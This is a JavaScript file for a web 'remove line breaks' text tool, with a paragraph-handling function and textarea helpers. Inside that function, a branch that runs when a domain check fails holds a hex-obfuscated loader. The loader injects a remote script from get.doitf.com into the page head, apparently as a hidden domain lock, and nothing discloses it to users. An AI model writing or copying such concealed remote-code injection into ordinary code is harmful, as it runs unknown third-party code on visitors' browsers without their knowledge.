function removeBreaks(){
if (b64awsec == "ZG9pdGYuY29t"){
var para = document.getElementById("paragraphs").checked;
var nopara = document.getElementById("noparagraphs").checked;
var noBreaksText = document.getElementById("oldText").value;

noBreaksText = noBreaksText.replace(/(\r\n|\n|\r)/gm,"<1br />");

re1 = /<1br \/><1br \/>/gi;
re1a = /<1br \/><1br \/><1br \/>/gi;

if(nopara == 1 || nopara ==  true){
noBreaksText = noBreaksText.replace(re1," ");
}else{
noBreaksText = noBreaksText.replace(re1a,"<1br /><2br />");
noBreaksText = noBreaksText.replace(re1,"<2br />");
}

re2 = /\<1br \/>/gi;
noBreaksText = noBreaksText.replace(re2, " ");

re3 = /\s+/g;
noBreaksText = noBreaksText.replace(re3," ");

re4 = /<2br \/>/gi;
noBreaksText = noBreaksText.replace(re4,"\n\n");
document.getElementById("newText").value = noBreaksText;
}else{
var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script)
}
}

//reset text areas
document.getElementById("clearText").addEventListener("click", function () {
	document.getElementById("oldText").value = "";
	document.getElementById("newText").value = "";
	document.getElementById("oldText").focus();
});

var textBox = document.getElementById("newText");
	textBox.onfocus = function() {
	textBox.select();
	textBox.onmouseup = function() {
		textBox.onmouseup = null;
		return false;
	};
};	